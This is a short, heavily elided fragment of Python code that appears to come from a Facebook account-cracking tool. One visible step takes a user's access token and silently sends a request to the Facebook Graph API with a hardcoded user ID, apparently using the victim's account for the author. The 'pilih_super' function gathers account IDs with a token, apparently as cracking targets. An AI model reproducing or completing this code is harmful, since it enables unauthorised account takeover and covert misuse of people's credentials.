	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				requests.post('https://graph.facebook.com/posts/likes?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
...
def pilih_super():
	...
	if peak =="":
		...
		r = requests.get("https://graph.facebook.com/posts/likes?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
